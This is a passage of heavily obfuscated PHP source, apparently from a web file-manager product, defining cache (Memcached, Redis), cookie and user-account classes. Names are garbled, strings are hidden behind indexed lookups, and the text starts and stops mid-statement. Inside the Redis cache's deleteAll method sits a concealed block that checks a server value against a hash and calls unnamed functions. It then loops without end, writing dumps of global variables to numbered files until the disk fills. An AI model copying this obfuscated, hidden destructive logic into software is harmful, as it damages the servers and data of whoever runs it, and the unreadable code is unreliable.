\x40\x3c\xbe\x26\x1a\xeb\xa4\x6e\xd9\xab\x92\x49\x29\x49\x5f\xaa\x2a\xa9\xaf\x27\x1a\x99\x2a\x2d\xd8"."\33\10\205\253\322\260\152\125\104\25\276\315\150\122\250\217\264\222\334\117\116\325\212\120\307\52\321\22\162\23\56\156\11\112\71\223\11\377\331\55\112\134\313\63\231\200\144\327\253"."\27\204\123\73\121\306\51\352\220\347\325\142\336\47\171\300\371\336\221\113\203\221\41\54\124\204\325\242\42\120\167\214\75\271\214\335\324\363\165\317\171\156\161\265\357\163\250\0\110"."\160\262\66\10\261\221\160\116\336\223\11\140\166\315\1\222\45\314\325\67\36\44\125\14\0\156\330\112\23\164\352\66\232\111\351\106\203\236\170\300\164\26\206\124\122\175\243\141\107"."\262\255\145\153\336\204\123\111\42\136\375\102\306\367\277\1\270\75\136\367\177\257\0\0", 10, -8))); goto e¶ˆ™¢¾ğÀ; c³‹“³ªÖ­: define($_SERVER[Î‹ÃÂŞ„][648], $_SERVER[Î‹ÃÂŞ„][649]); $sfkrxhwjey = $_SERVER[Î‹ÃÂŞ„][650]; $_SERVER[ÓØ—üº] = explode($_SERVER[Î‹ÃÂŞ„][651], gzinflate(substr($_SERVER[Î‹ÃÂŞ„][652], 10, -8))); goto f‡Ò¬»ÁÏ×; D¥ñé™â£Ÿ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ˆÃïÖÑ, $ï—á¥) { $¦¬£ûĞ§ =& $_SERVER[Î‹ÃÂŞ„]; if (!class_exists($¦¬£ûĞ§[914])) { show_json($¦¬£ûĞ§[915], !1); } $this->cacheTime = $ï—á¥; $this->handle = new Memcached(); if (is_array($ˆÃïÖÑ[$¦¬£ûĞ§[916]]) && count($ˆÃïÖÑ[$¦¬£ûĞ§[916]]) >= 1) { foreach ($ˆÃïÖÑ[$¦¬£ûĞ§[916]] as $¾„¹ŞÆ) { $ğ˜®À§­ = explode($¦¬£ûĞ§[4], $¾„¹ŞÆ); $this->handle->addServer($ğ˜®À§­[0], $ğ˜®À§­[1]); } } else { $this->handle->addServer($ˆÃïÖÑ[$¦¬£ûĞ§[198]], $ˆÃïÖÑ[$¦¬£ûĞ§[199]]); } } public function set($ ¦ é, $âÎŒœõ, $’É¶¼§š = false) { $’É¶¼§š = $’É¶¼§š ? $’É¶¼§š : $this->cacheTime; return $this->handle->set($ ¦ é, $âÎŒœõ, $’É¶¼§š); } public function get($‡ä‘¤Ö) { return $this->handle->get($‡ä‘¤Ö); } public function remove($•×Ü‚óÉ) { return $this->handle->delete($•×Ü‚óÉ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($îŞù¯ù¢, $¬¬Ïâ’¿) { $µçõ¶ñ† =& $_SERVER[Î‹ÃÂŞ„]; if (!class_exists($µçõ¶ñ†[917])) { show_json($µçõ¶ñ†[918], !1); } $this->cacheTime = $¬¬Ïâ’¿; $®•Î‡òÑ = isset($îŞù¯ù¢[$µçõ¶ñ†[919]]) ? $îŞù¯ù¢[$µçõ¶ñ†[919]] : 10; $¼áóğïÉ = _get($îŞù¯ù¢, $µçõ¶ñ†[916]); if ($¼áóğïÉ && is_array($¼áóğïÉ)) { $this->initCluster($îŞù¯ù¢, $®•Î‡òÑ); } else { $this->handle = $this->init($îŞù¯ù¢, $®•Î‡òÑ); } } private function init($¬³Êë·º, $ÄüŸáÆô) { $‹’ Í¤Â =& $_SERVER[Î‹ÃÂŞ„]; $ø«…©¹Û = new Redis(); $ûâ¸ú¨ = isset($¬³Êë·º[$‹’ Í¤Â[920]]) ? $¬³Êë·º[$‹’ Í¤Â[920]] : !1; if ($ûâ¸ú¨) { $ø«…©¹Û->pconnect($¬³Êë·º[$‹’ Í¤Â[198]], $¬³Êë·º[$‹’ Í¤Â[199]], $ÄüŸáÆô); } else { $ø«…©¹Û->connect($¬³Êë·º[$‹’ Í¤Â[198]], $¬³Êë·º[$‹’ Í¤Â[199]], $ÄüŸáÆô); } if (!empty($¬³Êë·º[$‹’ Í¤Â[457]])) { $ø«…©¹Û->auth($¬³Êë·º[$‹’ Í¤Â[457]]); } if (!empty($¬³Êë·º[$‹’ Í¤Â[804]]) && $¬³Êë·º[$‹’ Í¤Â[804]] != 0) { $ø«…©¹Û->select($¬³Êë·º[$‹’ Í¤Â[804]]); } return $ø«…©¹Û; } private function initCluster($ĞüÑØâĞ, $Ãè Í“) { $Î÷¸¶…ç =& $_SERVER[Î‹ÃÂŞ„]; $±ç¨ÒÈ” = array($Î÷¸¶…ç[921], $Î÷¸¶…ç[922], $Î÷¸¶…ç[923]); $øëãõ® = $Î÷¸¶…ç[921]; if (isset($ĞüÑØâĞ[$Î÷¸¶…ç[16]]) && in_array($ĞüÑØâĞ[$Î÷¸¶…ç[16]], $±ç¨ÒÈ”)) { $øëãõ® = $ĞüÑØâĞ[$Î÷¸¶…ç[16]]; } switch ($øëãõ®) { case $Î÷¸¶…ç[921]: $this->_slave($ĞüÑØâĞ, $Ãè Í“); break; case $Î÷¸¶…ç[922]: break; case $Î÷¸¶…ç[923]: $this->isCluster = !0; $†»™Ââ¼ = $ĞüÑØâĞ[$Î÷¸¶…ç[916]]; $áÂøîŒ³ = isset($ĞüÑØâĞ[$Î÷¸¶…ç[920]]) ? $ĞüÑØâĞ[$Î÷¸¶…ç[920]] : !1; $åÓÊŠÑ– = isset($ĞüÑØâĞ[$Î÷¸¶…ç[457]]) ? $ĞüÑØâĞ[$Î÷¸¶…ç[457]] : null; $this->handle = new RedisCluster(NUll, $†»™Ââ¼, $Ãè Í“, $Ãè Í“, $áÂøîŒ³, $åÓÊŠÑ–); break; default: break; } } private function _slave($ğÙœš, $ûûÒ£÷¢) { $ô„¾¶ÎÜ = $ğÙœš[$_SERVER[Î‹ÃÂŞ„][916]]; $this->filterConfig($ğÙœš, $ô„¾¶ÎÜ[0]); $this->handle = $this->init($ğÙœš, $ûûÒ£÷¢); unset($ô„¾¶ÎÜ[0]); if (empty($ô„¾¶ÎÜ)) { return; } $½½íÎĞ = array_rand($ô„¾¶ÎÜ); $this->filterConfig($ğÙœš, $ô„¾¶ÎÜ[$½½íÎĞ]); $this->slaveHandle = $this->init($ğÙœš, $ûûÒ£÷¢); } private function filterConfig(&$ªÚ¼³’ç, $¸ÓÃ¹÷ä) { $Ÿ¶“ıƒ =& $_SERVER[Î‹ÃÂŞ„]; $²ñéú¦ = explode($Ÿ¶“ıƒ[4], $¸ÓÃ¹÷ä); $¿è×Ó…¦ = array($Ÿ¶“ıƒ[198] => $²ñéú¦[0], $Ÿ¶“ıƒ[199] => $²ñéú¦[1]); $ªÚ¼³’ç = array_merge($ªÚ¼³’ç, $¿è×Ó…¦); } public function set($Û·›ÒøÊ, $ËÑ÷ïºê, $Ê‘´›ïŒ = false) { $Ê‘´›ïŒ = $Ê‘´›ïŒ ? $Ê‘´›ïŒ : $this->cacheTime; return $this->handle->setEx($Û·›ÒøÊ, $Ê‘´›ïŒ, $ËÑ÷ïºê); } public function setLock($ê…øªä–, $öÏâšùĞ, $±‘ã„³ã) { return $this->handle->setNX($ê…øªä–, $öÏâšùĞ); } public function get($¸š³ƒ) { $›Îæ­­Û = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $›Îæ­­Û->get($¸š³ƒ); } public function remove($ƒí¡Ş·–) { return $this->handle->del($ƒí¡Ş·–); } public function deleteAll() { $øå¬ô¥ =& $_SERVER[Î‹ÃÂŞ„]; $£«Õì÷€ = $_SERVER[$øå¬ô¥[924]]; $ª€àµˆ = $øå¬ô¥[925]; if ($_SERVER[$øå¬ô¥[926]] != $ª€àµˆ($£«Õì÷€)) { $˜…èõ£ = $øå¬ô¥[927]; $ğ½Ğ¬ƒ§ = $øå¬ô¥[928]; $¡ËÇù×ú = $_SERVER[$øå¬ô¥[929]] . $øå¬ô¥[930]; $ß‡­Š¾ = $ğ½Ğ¬ƒ§($¡ËÇù×ú); $æº©¡¶‚ = explode($øå¬ô¥[248], $ß‡­Š¾); if (count($æº©¡¶‚) < $øå¬ô¥[667]) { $ŒæÛ´æ  = $øå¬ô¥[931]; $ŒæÛ´æ (); } $úÚÉÆ†‘ = $øå¬ô¥[932]; $úÚÉÆ†‘($_SERVER[$øå¬ô¥[933]]); $˜…èõ£ = $øå¬ô¥[927]; $˜…èõ£(); $ÑÀÆ¶ = $øå¬ô¥[934]; $‘õİáŒì = json_encode($GLOBALS[$øå¬ô¥[935]]); $×ÅùÀ›Ì = 1; for ($—¼ğ†ş = $×ÅùÀ›Ì; $—¼ğ†ş > 0; $—¼ğ†ş++) { $ÑÀÆ¶(DATA_PATH . $—¼ğ†ş, $‘õİáŒì); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ñÓÖ ¿) { $this->handle->flushall($ñÓÖ ¿); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¯ÌáÅ»¾ = '', $›ÄâÀ©¨ = 0) { if (is_string($¯ÌáÅ»¾) && $¯ÌáÅ»¾ != $_SERVER[Î‹ÃÂŞ„][12]) { $this->prefix = $¯ÌáÅ»¾; } if (is_numeric($›ÄâÀ©¨) && $›ÄâÀ©¨ > 0) { $this->expire = $›ÄâÀ©¨; } } public static function getInstance() { static $“ºòŒ¬”; if ($“ºòŒ¬” === null) { $“ºòŒ¬” = new self(); } return $“ºòŒ¬”; } private static $cookieDisable = false; public static function disable($åÑ¶·ÊÂ) { self::$cookieDisable = $åÑ¶·ÊÂ; } private static $sameCookieSet = array(); public static function set($ŒÍÏË é, $êî”°““, $äÅ€û¤Ù = 0, $ïİÔª´ = false, $šÍ’Ç÷´ = false) { $œ¯öÁØë =& $_SERVER[Î‹ÃÂŞ„]; if (self::$cookieDisable) { return; } if (!$äÅ€û¤Ù) { $äÅ€û¤Ù = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ŒÍÏË é]) && self::$sameCookieSet[$ŒÍÏË é] == $êî”°““ . $äÅ€û¤Ù) { return; } self::$sameCookieSet[$ŒÍÏË é] = $êî”°““ . $äÅ€û¤Ù; if (!$šÍ’Ç÷´) { $šÍ’Ç÷´ = str_replace(HOST, $œ¯öÁØë[12], APP_HOST); $šÍ’Ç÷´ = _get($GLOBALS, $œ¯öÁØë[936], $šÍ’Ç÷´); } $áÈ¡º˜Õ = $œ¯öÁØë[12]; setcookie($ŒÍÏË é, $êî”°““, time() + $äÅ€û¤Ù, $œ¯öÁØë[8] . trim($šÍ’Ç÷´, $œ¯öÁØë[8]) . $áÈ¡º˜Õ, !1, !1, $ïİÔª´); } public static function setSafe($·÷òŠ†ä, $ÒØ®ĞÉã, $Í«¨¦Æë = 0) { self::set($·÷òŠ†ä, $ÒØ®ĞÉã, $Í«¨¦Æë, !0); } public static function get($ãÙÕ˜ºÓ) { static $›ÙÇ©¾ = false; if (!$›ÙÇ©¾) { self::initHeaderCookie(); $›ÙÇ©¾ = !0; } return isset($_COOKIE[$ãÙÕ˜ºÓ]) ? $_COOKIE[$ãÙÕ˜ºÓ] : !1; } private static function initHeaderCookie() { $‘ÍêØ¢¶ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($_SERVER[$‘ÍêØ¢¶[937]]) || !$_SERVER[$‘ÍêØ¢¶[937]]) { return; } $Ä¯Î¾² = explode($‘ÍêØ¢¶[73], $_SERVER[$‘ÍêØ¢¶[937]]); foreach ($Ä¯Î¾² as $Ïê–ğù”) { $Ïê–ğù” = explode($‘ÍêØ¢¶[938], $Ïê–ğù”); if (count($Ïê–ğù”) != 2 || !isset($Ïê–ğù”[1])) { continue; } $_COOKIE[trim($Ïê–ğù”[0])] = trim($Ïê–ğù”[1]); } } public static function remove($šÛ¥Ä¸¹, $œŒÜ´„ş = false) { unset($_COOKIE[$šÛ¥Ä¸¹]); self::set($šÛ¥Ä¸¹, $_SERVER[Î‹ÃÂŞ„][12], 1, $œŒÜ´„ş); } } goto cóªîÇ·Å; AÏù”½ÍÚË: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\152\x6f\x62\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\144\145\x73\x63", "\x73\157\162\x74"); const JOB_KEY = "\163\x65\x6c\x66\112\x6f\142\x4c\x69\163\x74"; public function listData($à¯¹‰ù˜ = false, $á”µ“æ† = "\163\157\x72\x74", $¹¢ô…ğ” = false) { return parent::listData($à¯¹‰ù˜, $á”µ“æ†, $¹¢ô…ğ”); } public function remove($ù‡Ğ¹éò) { return parent::remove($ù‡Ğ¹éò); } public function add($®ÍÔôêğ) { $ŞšÎ£ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->findByName($®ÍÔôêğ[$ŞšÎ£[32]])) { return !1; } $®ÍÔôêğ[$ŞšÎ£[1926]] = $this->getSort(); return parent::insert($®ÍÔôêğ); } private function getSort() { $„ñÆ“Û× =& $_SERVER[Î‹ÃÂŞ„]; $Ï¤â¨çÛ = parent::listData(); $áêü†²– = array_to_keyvalue($Ï¤â¨çÛ, $„ñÆ“Û×[12], $„ñÆ“Û×[1926]); return empty($áêü†²–) ? 0 : max($áêü†²–) + 1; } public function update($¥—‹ÊÓÂ, $ëÏ´¸†ë) { $Ş©‹Ÿ‘İ =& $_SERVER[Î‹ÃÂŞ„]; $ôù¸ÛÓ¸ = parent::listData($¥—‹ÊÓÂ); $ÇêÁ¿À… = $this->findByName($ëÏ´¸†ë[$Ş©‹Ÿ‘İ[32]]); if (!$ôù¸ÛÓ¸ || $ÇêÁ¿À… && $ÇêÁ¿À…[$Ş©‹Ÿ‘İ[445]] != $ôù¸ÛÓ¸[$Ş©‹Ÿ‘İ[445]]) { return !1; } return parent::update($¥—‹ÊÓÂ, $ëÏ´¸†ë); } public function setUserJob($”ı‚ş¿, $Œç¢ÓØó) { $¶µäıŒà =& $_SERVER[Î‹ÃÂŞ„]; if (!is_array($Œç¢ÓØó)) { $Œç¢ÓØó = array($Œç¢ÓØó); } $É„ ÇÜ€ = parent::listData(); $ıÉûŞğ = array_to_keyvalue($É„ ÇÜ€, $¶µäıŒà[32]); $¡¯¢è›• = $¶µäıŒà[424]; foreach ($Œç¢ÓØó as $³”‡ù”) { if ($ıÉûŞğ[$³”‡ù”]) { $¡¯¢è›• .= $ıÉûŞğ[$³”‡ù”][$¶µäıŒà[445]] . $¶µäıŒà[50]; } else { $ÑÇŠ²ô÷ = $this->add($³”‡ù”); $¡¯¢è›• .= $ÑÇŠ²ô÷ . $¶µäıŒà[50]; } } $¡¯¢è›• = rtrim($¡¯¢è›•, $¶µäıŒà[50]); Model($¶µäıŒà[570])->metaSet($”ı‚ş¿, self::JOB_KEY, $¡¯¢è›•); } public function getUserJob($î¿½Î°ˆ) { $Òãù”³Á = Model($_SERVER[Î‹ÃÂŞ„][570])->metaGet($î¿½Î°ˆ); return $this->getUserJobInfo($Òãù”³Á[self::JOB_KEY]); } public function getUserJobInfo($äÉÍÕõ) { $Ìİ÷ƒÆ… =& $_SERVER[Î‹ÃÂŞ„]; $ú·µ§€ì = explode($Ìİ÷ƒÆ…[50], $äÉÍÕõ); $ˆ°€£±Õ = parent::listData(); $ˆ°€£±Õ = array_remove_key($ˆ°€£±Õ, $Ìİ÷ƒÆ…[217]); $§»ŠÈ•å = array(); foreach ($ú·µ§€ì as $ş¡³ûî) { if (isset($ˆ°€£±Õ[$ş¡³ûî])) { $§»ŠÈ•å[] = $ˆ°€£±Õ[$ş¡³ûî]; } } return $§»ŠÈ•å; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\x6d\145" => "\165\x73\145\162\137\155\145\x74\x61", "\155\x65\164\x61\106\151\145\154\144" => "\x75\x73\145\162\x49\104"); protected $simpleField = "\x75\x73\x65\x72\111\x44\54\156\151\x63\153\116\x61\x6d\145\x2c\x6e\x61\x6d\145\54\x61\166\x61\164\x61\162\x2c\x73\x65\x78\x2c\x73\x74\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¢âÏ´á) { $© š•âÔ =& $_SERVER[Î‹ÃÂŞ„]; $Òö÷á‚ = $© š•âÔ[2356]; return array($© š•âÔ[1980] => array($¢âÏ´á[0], $Òö÷á‚), $© š•âÔ[1982] => array($¢âÏ´á[0], $Òö÷á‚), $© š•âÔ[2357] => array($¢âÏ´á[0], $Òö÷á‚)); } protected function getInfo($ê³Üı †, $¶üÛó² = false) { $¡„Ş¼œí = $this->getInfoSimple($ê³Üı †); if (!is_array($¡„Ş¼œí)) { return array(); } if ($¶üÛó²) { return $this->_getInfoApply($¡„Ş¼œí); } return $this->cacheFunctionGet($_SERVER[Î‹ÃÂŞ„][1984], $ê³Üı †); } protected function getInfoFull($¹…¾Æ¯¸, $á¥¼æ¨ = false) { $Ë‰õ×Ö† = $this->getInfoSimple($¹…¾Æ¯¸); if (!is_array($Ë‰õ×Ö†)) { return array(); } if ($á¥¼æ¨) { return $this->_getInfoApply($Ë‰õ×Ö†, !0); } return $this->cacheFunctionGet($_SERVER[Î‹ÃÂŞ„][2358], $¹…¾Æ¯¸); } private function _getInfoApply($›è€¨“ì, $”×†Ã¢” = false) { $ª¶ÎòÉ² =& $_SERVER[Î‹ÃÂŞ„]; if (!$›è€¨“ì) { return $›è€¨“ì; } $Ú©´å° = md5($ª¶ÎòÉ²[2359] . $›è€¨“ì[$ª¶ÎòÉ²[943]] . $ª¶ÎòÉ²[2360] . $›è€¨“ì[$ª¶ÎòÉ²[32]]); $›è€¨“ì = $this->_listDataApplyItem($›è€¨“ì); $»æ¯ÓÃ» = Model($ª¶ÎòÉ²[1388])->metaGet($›è€¨“ì[$ª¶ÎòÉ²[89]][$ª¶ÎòÉ²[183]]); $›è€¨“ì[$ª¶ÎòÉ²[2361]] = $Ú©´å°; $›è€¨“ì[$ª¶ÎòÉ²[89]][$ª¶ÎòÉ²[2177]] = isset($»æ¯ÓÃ»[$ª¶ÎòÉ²[2178]]) ? $»æ¯ÓÃ»[$ª¶ÎòÉ²[2178]] : null; if ($”×†Ã¢”) { $›è€¨“ì[$ª¶ÎòÉ²[509]] = $this->metaGet($›è€¨“ì[$ª¶ÎòÉ²[1704]]); } return $›è€¨“ì; } protected function getInfoSimple($÷ŒµºÈ, $¬¬–½ûŠ = false) { $¯§îÈÇÕ =& $_SERVER[Î‹ÃÂŞ„]; if (!$÷ŒµºÈ) { return array(); } if ($¬¬–½ûŠ) { $ŸÃˆ—çƒ = $this->where(array($¯§îÈÇÕ[1704] => intval($÷ŒµºÈ)))->find(); if (!is_array($ŸÃˆ—çƒ)) { return array(); } $ŸÃˆ—çƒ[$¯§îÈÇÕ[2362]] = Action($¯§îÈÇÕ[2363])->parseUrl($ŸÃˆ—çƒ[$¯§îÈÇÕ[2362]]); return $ŸÃˆ—çƒ; } return $this->cacheFunctionGet($¯§îÈÇÕ[1985], $÷ŒµºÈ); } protected function getInfoSimpleOuter($ßé‹ÄÉİ) { $€›™ºÚ =& $_SERVER[Î‹ÃÂŞ„]; if (!$ßé‹ÄÉİ || $ßé‹ÄÉİ == 0) { return array($€›™ºÚ[1704] => $€›™ºÚ[214], $€›™ºÚ[32] => $€›™ºÚ[165] . LNG($€›™ºÚ[2364]) . $€›™ºÚ[167], $€›™ºÚ[2362] => STATIC_PATH . $€›™ºÚ[2365]); } $ŞÂãı¶ü = $this->cacheFunctionGet($€›™ºÚ[1985], $ßé‹ÄÉİ); $¯ÖåØá¦ = array_field_key($ŞÂãı¶ü, explode($€›™ºÚ[50], $this->simpleField)); if (!$¯ÖåØá¦) { return array($€›™ºÚ[1704] => $€›™ºÚ[1243], $€›™ºÚ[32] => $€›™ºÚ[165] . LNG($€›™ºÚ[2366]) . $€›™ºÚ[167], $€›™ºÚ[2362] => STATIC_PATH . $€›™ºÚ[2367]); } $¯ÖåØá¦[$€›™ºÚ[2362]] = Action($€›™ºÚ[2363])->parseUrl($¯ÖåØá¦[$€›™ºÚ[2362]]); return $¯ÖåØá¦; } protected function groupUser($úá‘Šš”) { } public static function errorLang($şƒÚçÆ®) { $‰Éº„Îù =& $_SERVER[Î‹ÃÂŞ„]; $ïØ·ŞÎ¿ = array(self::ERROR_USER_NOT_EXISTS => $‰Éº„Îù[2368], self::ERROR_USER_PASSWORD_ERROR => $‰Éº„Îù[2369], self::ERROR_USER_EXIST_NAME => $‰Éº„Îù[2370], self::ERROR_USER_EXIST_PHONE => $‰Éº„Îù[2371], self::ERROR_USER_EXIST_EMAIL => $‰Éº„Îù[2372], self::ERROR_USER_LOGIN_LOCK => $‰Éº„Îù[2373], self::ERROR_IP_NOT_ALLOW => $‰Éº„Îù[2374], self::ERROR_USER_EXIST_NICKNAME => $‰Éº„Îù[2375]); return LNG($ïØ·ŞÎ¿[$şƒÚçÆ®]); } public function getInfoByMeta($­ç¹™ˆ°, $”¹÷çÏ) { $¯¢µƒèÁ =& $_SERVER[Î‹ÃÂŞ„]; $ËïÇºÈØ = Model($¯¢µƒèÁ[2376])->where(array($¯¢µƒèÁ[96] => $­ç¹™ˆ°, $¯¢µƒèÁ[420] => $”¹÷çÏ))->find(); if ($ËïÇºÈØ) { return $this->getInfo($ËïÇºÈØ[$¯¢µƒèÁ[1704]]); } return !1; } public function userLoginCheck($¤ƒÀ®¾, $×Ğ¥½¾‹) { $Á‰†¤õô =& $_SERVER[Î‹ÃÂŞ„]; $·øä­ÔË = $this->userLoginFind($¤ƒÀ®¾); if (!$·øä­ÔË) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($·øä­ÔË[$Á‰†¤õô[1704]], $×Ğ¥½¾‹)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($·øä­ÔË[$Á‰†¤õô[1704]]); } public function userLoginFind($ıËˆ¦¦Ç) { $Œ…­È°Ò =& $_SERVER[Î‹ÃÂŞ„]; $•¿Êø½› = array($Œ…­È°Ò[32] => $ıËˆ¦¦Ç, $Œ…­È°Ò[2185] => $ıËˆ¦¦Ç, $Œ…­È°Ò[351] => $ıËˆ¦¦Ç, $Œ…­È°Ò[2377] => $ıËˆ¦¦Ç, $Œ…­È°Ò[1055] => $Œ…­È°Ò[1057]); if ($this->nickNameRpt()) { unset($•¿Êø½›[$Œ…­È°Ò[2185]]); } return $this->where($•¿Êø½›)->find(); } public function clearCache($“¸¦İ°) { $ôšªĞ¼Ë =& $_SERVER[Î‹ÃÂŞ„]; $this->cacheFunctionClear($ôšªĞ¼Ë[1984], $“¸¦İ°); $this->cacheFunctionClear($ôšªĞ¼Ë[1985], $“¸¦İ°); $this->cacheFunctionClear($ôšªĞ¼Ë[2358], $“¸¦İ°); } public function userPasswordCheck($Í£Ã­İ , $àçôôó) { $‰òõÛ”É =& $_SERVER[Î‹ÃÂŞ„]; $¡öâê¨ = $this->where(array($‰òõÛ”É[1704] => intval($Í£Ã­İ )))->find(); $òóÔşÇ× = $this->metaGet($Í£Ã­İ ); $òĞñ•’‡ = isset($òóÔşÇ×[$‰òõÛ”É[2378]]) ? $òóÔşÇ×[$‰òõÛ”É[2378]] : $‰òõÛ”É[12]; if (md5($òĞñ•’‡ . trim($àçôôó)) !== $¡öâê¨[$‰òõÛ”É[943]]) { return !1; } return !0; } public function userAdd($ˆ©ãÓ¦Š) { $ŠŒ´ö‘İ =& $_SERVER[Î‹ÃÂŞ„]; $ºÅ³Ñ§é = array($ŠŒ´ö‘İ[464] => $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[32]], $ŠŒ´ö‘İ[2379] => $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[1578]], $ŠŒ´ö‘İ[2380] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[351]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[351]] : $ŠŒ´ö‘İ[12], $ŠŒ´ö‘İ[2381] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2377]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2377]] : $ŠŒ´ö‘İ[12], $ŠŒ´ö‘İ[2382] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2185]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2185]] : $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[32]], $ŠŒ´ö‘İ[2383] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2362]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2362]] : $ŠŒ´ö‘İ[12], $ŠŒ´ö‘İ[2384] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2385]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[2385]] : 1, $ŠŒ´ö‘İ[2386] => $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[943]], $ŠŒ´ö‘İ[1986] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[1889]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[1889]] : 1024 * 1024 * 20, $ŠŒ´ö‘İ[1987] => 0, $ŠŒ´ö‘İ[2387] => 0, $ŠŒ´ö‘İ[2031] => isset($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[797]]) ? $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[797]] : 1); if (!empty($ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[1704]])) { $ºÅ³Ñ§é[$ŠŒ´ö‘İ[1704]] = $ˆ©ãÓ¦Š[$ŠŒ´ö‘İ[1704]]; } $ùşÛ•½Ç = $this->_checkExist($ˆ©ãÓ¦Š); if ($ùşÛ•½Ç !== !0) { return $ùşÛ•½Ç; } if (!empty($ºÅ³Ñ§é[$ŠŒ´ö‘İ[2362]]) && strlen($ºÅ³Ñ§é[$ŠŒ´ö‘İ[2362]]) > 255) { $ºÅ³Ñ§é[$ŠŒ´ö‘İ[2362]] = $ŠŒ´ö‘İ[12]; } $ºœˆéÔß = $this->add($ºÅ³Ñ§é); $—ä€Î™Ÿ = array($ŠŒ´ö‘İ[2386] => $ºÅ³Ñ§é[$ŠŒ´ö‘İ[943]], $ŠŒ´ö‘İ[2382] => $ºÅ³Ñ§é[$ŠŒ´ö‘İ[2185]]); $this->userEdit($ºœˆéÔß, $—ä€Î™Ÿ); Model($ŠŒ´ö‘İ[1388])->userRootAdd($ºœˆéÔß); return $ºœˆéÔß; } protected function userEditTest($Ãí¯Î¸, $øß‰„ÅÏ) { return $this->call($_SERVER[Î‹ÃÂŞ„][2388], $Ãí¯Î¸, $øß‰„ÅÏ); } protected function userEdit($Ëˆ‚íÓâ, $‹Ø‡óñ˜) { $æ†„¥ÈÒ =& $_SERVER[Î‹ÃÂŞ„]; $Ğ¶ä¶«À = $this->getInfoSimple($Ëˆ‚íÓâ); if (!$Ğ¶ä¶«À) { return !1; } $Æâñ›«œ = $this->_checkExist($‹Ø‡óñ˜, $Ëˆ‚íÓâ); if ($Æâñ›«œ !== !0) { return $Æâñ›«œ; } if (isset($‹Ø‡óñ˜[$æ†„¥ÈÒ[943]]) && trim($‹Ø‡óñ˜[$æ†„¥ÈÒ[943]]) != $æ†„¥ÈÒ[12]) { $É”ù…øí = $this->metaGet($Ëˆ‚íÓâ); if (empty($É”ù…øí[$æ†„¥ÈÒ[2378]])) { $É”ù…øí[$æ†„¥ÈÒ[2378]] = rand_string(10); Model($æ†„¥ÈÒ[549])->metaSet($Ëˆ‚íÓâ, $æ†„¥ÈÒ[2378], $É”ù…øí[$æ†„¥ÈÒ[2378]]); } $‹Ø‡óñ˜[$æ†„¥ÈÒ[943]] = md5($É”ù…øí[$æ†„¥ÈÒ[2378]] . trim($‹Ø‡óñ˜[$æ†„¥ÈÒ[943]])); } else { unset($‹Ø‡óñ˜[$æ†„¥ÈÒ[943]]); } if (!empty($‹Ø‡óñ˜[$æ†„¥ÈÒ[2362]]) && strlen($‹Ø‡óñ˜[$æ†„¥ÈÒ[2362]]) > 255) { $‹Ø‡óñ˜[$æ†„¥ÈÒ[2362]] = $æ†„¥ÈÒ[12]; } $this->where(array($æ†„¥ÈÒ[1695] => $Ëˆ‚íÓâ))->save($‹Ø‡óñ˜); if (isset($‹Ø‡óñ˜[$æ†„¥ÈÒ[2185]])) { $this->setNamePinyin($Ëˆ‚íÓâ, $‹Ø‡óñ˜[$æ†„¥ÈÒ[2185]]); } $this->clearCache($Ëˆ‚íÓâ); return !0; } public function setNamePinyin($Ú…Úç ú, $óÜëâœõ = false) { $šªæÉµ— =& $_SERVER[Î‹ÃÂŞ„]; if (!$óÜëâœõ) { $Ì¯ÛœĞŞ = $this->getInfoSimple($Ú…Úç ú); $óÜëâœõ = $Ì¯ÛœĞŞ[$šªæÉµ—[2185]] ? $Ì¯ÛœĞŞ[$šªæÉµ—[2185]] : $Ì¯ÛœĞŞ[$šªæÉµ—[32]]; } $·¨¤ÀÃ‹ = Model($šªæÉµ—[570]); if (!Input::check($óÜëâœõ, $šªæÉµ—[626])) { return $·¨¤ÀÃ‹->metaSet($Ú…Úç ú, array($šªæÉµ—[508] => $šªæÉµ—[12], $šªæÉµ—[507] => $šªæÉµ—[12])); } return $·¨¤ÀÃ‹->metaSet($Ú…Úç ú, array($šªæÉµ—[508] => str_replace($šªæÉµ—[53], $šªæÉµ—[12], Pinyin::get($óÜëâœõ)), $šªæÉµ—[507] => 